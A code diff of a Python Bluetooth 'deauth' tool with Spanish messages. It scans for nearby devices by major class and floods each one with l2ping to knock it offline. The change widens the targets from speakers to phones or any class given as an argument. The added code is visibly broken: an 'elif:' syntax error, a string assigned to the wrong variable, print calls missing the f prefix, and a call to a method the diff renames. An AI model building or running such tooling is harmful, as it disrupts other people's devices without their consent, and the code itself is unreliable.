@@ -1,3 +1,4 @@
+import argparse
 import subprocess
 from Scanner import Scanner
 from constants import PHONE_BRANDS, SPEAKER_BRANDS, SPEAKER_KEYWORDS
@@ -28,45 +29,48 @@ class SpeakerDeauthorizer:
         self.scanner = scanner
         self.deauther = deauther
 
-
-    def deauthorize_speakers(self):
+    def deauthorize_devices(self, major_device_class):
         """ Intento de deauth un dispositivo Bluetooth usando l2ping flood """
-        print("Iniciando Deauth parlantes...")
-        speaker_major_class = 4
-        speakers = self.scanner.scan_for_devices(major_device_class= speaker_major_class)
+        device_type_name = ""
+        if major_device_class == 2:
+            device_type_name = "Mobile Phones"
+        elif: major_device_class == 4:
+            major_device_class = "Bluetooth Speakers"
+        else:
+            device_type_name =f"devices with major class ID {major_device_class}"
+
+        print("Iniciando Deauth {device_type_name}...")
+        devices = self.scanner.scan_for_devices(major_device_class= major_device_class)
         
-        if not speakers:
-            print("No se encontraron parlantes Bluetooth ofensores")
+        if not devices:
+            print("No se encontraron {device_type_name} ofensores")
             return
 
-        print("\nParlantes encontrados:")
-        for speaker_mac in speakers:
-            print(f"- {speaker_mac}")
+        print("\n{device_type_name} encontrados:")
+        for device_mac in devices:
+            print(f"- {device_mac}")
 
-        print("\nIniciando Deauth de parlantes ofensores...")
-        for speaker_mac in speakers:
-            print(f"\nIntentando Deauth el parlante {speaker_mac}...")
-            self.deauther.deauth_device(speaker_mac)
+        print("\nIniciando Deauth de {device_type_name} ofensores...")
+        for device_mac in devices:
+            print(f"\nIntentando Deauth {device_type_name} {device_mac}...")
+            self.deauther.deauth_device(device_mac)
 
-        print("\nProceso de Deauth iniciado para todos los parlantes encontrados.")
+        print(f"\nProceso de Deauth iniciado para todos los {device_type_name} encontrados.")
 
 class SpeakerDeauthorizerRunner:
     @staticmethod
     def run():
+        parser = argparse.ArgumentParser(description="Deauthorize Bluetooth devices by major class ID.")
+        parser.add_argument("major_class", type=int, help="Major Class ID de dispositivos a atacar; 4 para parlantes, 2 para telefonos.")
+        args = parser.parse_args()
+
         adapter_id = 1
-        category = 4
+        major_device_class = args.major_class
+
         scanner = Scanner(adapter=adapter_id)
         deauther = Deauther(adapter=adapter_id)
         speaker_deautherizer = SpeakerDeauthorizer(scanner,deauther)
-        speaker_deautherizer.deauthorize_speakers()
-
-        print("\n--- Scaneando Dsipositivos de Interes ---")
-        found_devices = scanner.scan_for_devices(major_device_class=category)
-        if found_devices:
-            print(f"\nLista de MAC Addresses de Interes categoria {category}:")
-            print(found_devices)
-        else:
-            print(f"\nNo devices encontrados en categoria {category}.")
+        speaker_deautherizer.deauthorize_speakers(major_device_class)
 
 if __name__ == "__main__":
     SpeakerDeauthorizerRunner.run()
